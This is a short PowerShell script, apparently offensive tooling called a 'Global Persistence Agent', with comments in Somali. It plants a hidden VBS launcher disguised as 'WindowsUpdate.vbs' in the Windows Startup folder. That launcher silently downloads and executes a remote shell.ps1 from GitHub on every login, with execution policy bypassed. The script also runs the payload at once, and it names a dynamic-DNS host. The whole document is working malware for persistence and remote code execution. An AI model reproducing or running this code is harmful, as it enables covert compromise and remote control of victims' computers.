# Somali Elite Framework - Global Persistence Agent
# Author: Eng Khapiip

$HOST_NAME = "khapiip-elite.ddns.net" 
$GITHUB_URL = "https://raw.githubusercontent.com/KHAPIIP/Somali-Elite-Framework/main/shell.ps1"

# 1. Abuuri Persistence (Startup Folder) si uusan marnaba u bixin
$path = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.vbs"
$cmd = "powershell -NoP -W Hidden -Exec Bypass -Command IEX(New-Object Net.WebClient).DownloadString('$GITHUB_URL')"
$vbs = 'Set objShell = WScript.CreateObject("WScript.Shell")' + "`n" + "objShell.Run ""$cmd"", 0"

Set-Content -Path $path -Value $vbs

# 2. Hadda si toos ah u kici Shell-ka
IEX(New-Object Net.WebClient).DownloadString($GITHUB_URL)
